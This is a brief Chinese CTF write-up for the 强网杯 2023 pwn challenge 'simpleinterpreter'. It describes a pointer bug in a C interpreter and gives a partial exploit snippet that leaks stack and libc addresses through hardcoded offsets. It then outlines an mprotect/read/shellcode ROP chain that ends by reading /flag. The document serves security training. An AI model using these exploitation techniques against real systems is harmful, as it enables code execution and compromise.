# simpleinterpreter

> 分类：Pwn

## 题目描述

github 有源码的 C 解释器（2022 HWS 出过）。漏洞点在于 C 指针的可操作性，通过 `memory_addr = &memory_addr` 获得内存地址，加减偏移得栈地址和 libc 地址，劫持 ret 为栈上 ROP。

## 考察知识点

- C 解释器（指针漏洞）
- 栈地址 / libc 地址泄露
- mprotect + read + shellcode（ROP）

## 解法

1. 功能 11 存在 `*v21 = qword_205090` 的任意写。
2. 用 `memory_addr = &memory_addr` 取到自身地址，再加减偏移泄露栈地址和 libc 基址。
3. 构造 ROP：先 mprotect 给栈段执行权限，再 read 读入 shellcode，最后跳转执行。

```c
int main() {
    int *memory_addr;
    int *stack_addr;
    int libc_addr;
    memory_addr = &memory_addr;
    memory_addr = memory_addr + (0x18/8);
    stack_addr = *memory_addr;
    stack_addr = stack_addr - (0xe0/8);
    libc_addr = *stack_addr;
    libc_addr = libc_addr - 0x021c87;
    // ... 依次写 rdi/rsi/rdx/mprotect/read，最后 shellcode
}
```

## 参考答案

（flag 通过 shellcode cat /flag）

## 来源

- 作者：星盟安全团队 | https://blog.xmcve.com/2023/12/18/强网杯2023-Writeup/
